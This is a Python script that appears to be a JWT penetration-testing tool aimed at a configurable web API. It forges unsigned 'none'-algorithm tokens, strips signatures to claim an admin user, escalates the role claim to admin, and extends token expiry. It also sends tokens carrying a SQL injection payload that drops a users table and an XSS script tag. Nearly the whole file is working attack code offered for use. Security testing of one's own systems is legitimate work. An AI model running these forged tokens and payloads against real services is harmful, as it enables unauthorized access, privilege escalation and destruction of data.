import requests
import jwt
import json
from datetime import datetime, timedelta
import sys
import base64
import logging

# Configure logging
logging.basicConfig(filename='jwt_test.log', level=logging.INFO, format='%(asctime)s %(levelname)s: %(message)s')

# Configuration
BASE_URL = 'https://example.com/api'  # Replace with your web application URL
LOGIN_ENDPOINT = '/login'
PROTECTED_ENDPOINT = '/protected'
USERNAME = 'your_username'  # Replace with valid credentials
PASSWORD = 'your_password'
SECRET_KEY = ''  # Replace with the secret key if known
PUBLIC_KEY = '''-----BEGIN PUBLIC KEY-----
...
-----END PUBLIC KEY-----'''  # Replace with the public key if known

def get_jwt_token():
    # Authenticate and get JWT token
    auth_url = BASE_URL + LOGIN_ENDPOINT
    credentials = {'username': USERNAME, 'password': PASSWORD}
    response = requests.post(auth_url, json=credentials)

    if response.status_code == 200:
        token = response.json().get('token')
        if token:
            logging.info('JWT Token obtained successfully.')
            return token
        else:
            logging.error('Token not found in response.')
            sys.exit(1)
    else:
        logging.error(f'Authentication failed with status code {response.status_code}')
        sys.exit(1)

def decode_jwt_token(token):
    try:
        # Decode the JWT token without verifying the signature (for testing purposes)
        decoded = jwt.decode(token, options={"verify_signature": False})
        logging.info('Decoded JWT Token:')
        logging.info(json.dumps(decoded, indent=4))
        return decoded
    except Exception as e:
        logging.error(f'Failed to decode JWT token: {e}')
        sys.exit(1)

def verify_jwt_token(token, public_key):
    try:
        decoded = jwt.decode(token, public_key, algorithms=["RS256"])
        logging.info('JWT Token verified successfully.')
        return decoded
    except Exception as e:
        logging.error(f'Failed to verify JWT token: {e}')
        sys.exit(1)

def test_protected_endpoint(token):
    headers = {'Authorization': f'Bearer {token}'}
    protected_url = BASE_URL + PROTECTED_ENDPOINT
    response = requests.get(protected_url, headers=headers)

    if response.status_code == 200:
        logging.info('Accessed protected endpoint successfully.')
        logging.info('Response data:')
        logging.info(response.json())
    else:
        logging.warning(f'Failed to access protected endpoint. Status code: {response.status_code}')
        logging.warning('Response data:')
        logging.warning(response.text)

def test_algorithm_confusion(decoded_token):
    logging.info('\nTesting Algorithm Confusion Attack:')
    try:
        # Create a token with 'none' algorithm
        headers = {'alg': 'none'}
        token_none_alg = jwt.encode(decoded_token, key=None, algorithm=None, headers=headers)
        test_protected_endpoint(token_none_alg)
    except Exception as e:
        logging.error(f'Error during Algorithm Confusion Attack test: {e}')

def test_signature_bypass(token):
    logging.info('\nTesting Signature Verification Bypass:')
    try:
        # Split the token into header, payload, and signature
        parts = token.split('.')
        if len(parts) != 3:
            logging.error('Invalid token format.')
            return
        header, payload, signature = parts
        # Tamper with the payload
        tampered_payload_data = json.dumps({"user": "admin"})
        tampered_payload = base64.urlsafe_b64encode(tampered_payload_data.encode()).decode().rstrip('=')
        # Construct the tampered token
        tampered_token = f"{header}.{tampered_payload}."
        test_protected_endpoint(tampered_token)
    except Exception as e:
        logging.error(f'Error during Signature Verification Bypass test: {e}')

def test_token_replay(token):
    logging.info('\nTesting Token Replay Attack:')
    try:
        # Use the same token multiple times
        for i in range(3):
            logging.info(f'Test iteration {i+1}')
            test_protected_endpoint(token)
    except Exception as e:
        logging.error(f'Error during Token Replay Attack test: {e}')

def test_expiration_manipulation(decoded_token):
    logging.info('\nTesting Token Expiration Manipulation:')
    try:
        if not SECRET_KEY:
            logging.warning('Secret key not provided. Skipping expiration manipulation test.')
            return
        # Set expiration time to a future date
        decoded_token['exp'] = datetime.utcnow() + timedelta(days=365)
        manipulated_token = jwt.encode(decoded_token, SECRET_KEY, algorithm='HS256')
        test_protected_endpoint(manipulated_token)
    except Exception as e:
        logging.error(f'Error during Token Expiration Manipulation test: {e}')

def test_aud_iss_claims(decoded_token):
    logging.info('\nTesting Audience and Issuer Claims:')
    try:
        if not SECRET_KEY:
            logging.warning('Secret key not provided. Skipping aud/iss claims test.')
            return
        # Modify 'aud' and 'iss' claims
        decoded_token['aud'] = 'unauthorized_audience'
        decoded_token['iss'] = 'unauthorized_issuer'
        manipulated_token = jwt.encode(decoded_token, SECRET_KEY, algorithm='HS256')
        test_protected_endpoint(manipulated_token)
    except Exception as e:
        logging.error(f'Error during Audience and Issuer Claims test: {e}')

def test_privilege_escalation(decoded_token):
    logging.info('\nTesting Privilege Escalation:')
    try:
        if not SECRET_KEY:
            logging.warning('Secret key not provided. Skipping privilege escalation test.')
            return
        # Modify 'role' claim to 'admin'
        decoded_token['role'] = 'admin'
        manipulated_token = jwt.encode(decoded_token, SECRET_KEY, algorithm='HS256')
        test_protected_endpoint(manipulated_token)
    except Exception as e:
        logging.error(f'Error during Privilege Escalation test: {e}')

def test_sensitive_data_exposure(decoded_token):
    logging.info('\nTesting for Sensitive Data Exposure in Token:')
    try:
        # Check for sensitive data in the token payload
        sensitive_fields = ['password', 'ssn', 'credit_card', 'secret']
        for field in sensitive_fields:
            if field in decoded_token:
                logging.warning(f'Sensitive data found in token: {field} = {decoded_token[field]}')
    except Exception as e:
        logging.error(f'Error during Sensitive Data Exposure test: {e}')

def test_injection_via_claims(decoded_token):
    logging.info('\nTesting Injection Attacks via JWT Claims:')
    try:
        if not SECRET_KEY:
            logging.warning('Secret key not provided. Skipping injection attacks test.')
            return
        # Insert SQL injection payload into 'username' claim
        decoded_token['username'] = "'; DROP TABLE users;--"
        manipulated_token = jwt.encode(decoded_token, SECRET_KEY, algorithm='HS256')
        test_protected_endpoint(manipulated_token)
    except Exception as e:
        logging.error(f'Error during Injection Attacks test: {e}')

def test_xss_via_jwt(decoded_token):
    logging.info('\nTesting Cross-Site Scripting (XSS) via JWT:')
    try:
        if not SECRET_KEY:
            logging.warning('Secret key not provided. Skipping XSS via JWT test.')
            return
        # Insert XSS payload into 'name' claim
        decoded_token['name'] = '<script>alert("XSS")</script>'
        manipulated_token = jwt.encode(decoded_token, SECRET_KEY, algorithm='HS256')
        test_protected_endpoint(manipulated_token)
    except Exception as e:
        logging.error(f'Error during XSS via JWT test: {e}')

def test_error_handling(token):
    logging.info('\nTesting Server Error Handling:')
    try:
        # Send a completely invalid token
        invalid_token = 'invalid.token.string'
        test_protected_endpoint(invalid_token)
    except Exception as e:
        logging.error(f'Error during Error Handling test: {e}')

def automated_token_testing(decoded_token):
    logging.info('\nAutomated Token Testing:')
    try:
        if not SECRET_KEY:
            logging.warning('Secret key not provided. Skipping automated token testing.')
            return
        test_cases = [
            {'exp': datetime.utcnow() + timedelta(days=365)},
            {'aud': 'unauthorized_audience'},
            {'iss': 'unauthorized_issuer'},
            {'role': 'admin'}
        ]
        for test_case in test_cases:
            modified_token_data = decoded_token.copy()
            modified_token_data.update(test_case)
            manipulated_token = jwt.encode(modified_token_data, SECRET_KEY, algorithm='HS256')
            logging.info(f'Testing with modified claims: {test_case}')
            test_protected_endpoint(manipulated_token)
    except Exception as e:
        logging.error(f'Error during Automated Token Testing: {e}')

def main():
    # Step 1: Get JWT token
    token = get_jwt_token()

    # Step 2: Decode JWT token
    decoded_token = decode_jwt_token(token)

    # Step 3: Verify JWT token signature (if you have the public key)
    # Uncomment the following lines if you have the public key
    # decoded_token = verify_jwt_token(token, PUBLIC_KEY)

    # Step 4: Test protected endpoint with valid token
    logging.info('\nTesting with valid token:')
    test_protected_endpoint(token)

    # Step 5: Test protected endpoint with invalid token
    logging.info('\nTesting with invalid token:')
    invalid_token = token[:-1] + 'x'  # Tamper with the token
    test_protected_endpoint(invalid_token)

    # Additional Tests
    # Test Algorithm Confusion Attack
    test_algorithm_confusion(decoded_token)

    # Test Signature Verification Bypass
    test_signature_bypass(token)

    # Test Token Replay Attack
    test_token_replay(token)

    # Test Token Expiration Manipulation
    test_expiration_manipulation(decoded_token)

    # Test Audience and Issuer Claims
    test_aud_iss_claims(decoded_token)

    # Test Privilege Escalation
    test_privilege_escalation(decoded_token)

    # Test for Sensitive Data Exposure
    test_sensitive_data_exposure(decoded_token)

    # Test Injection Attacks via JWT Claims
    test_injection_via_claims(decoded_token)

    # Test Cross-Site Scripting via JWT
    test_xss_via_jwt(decoded_token)

    # Test Server Error Handling
    test_error_handling(token)

    # Automated Token Testing
    automated_token_testing(decoded_token)

if __name__ == '__main__':
    main()

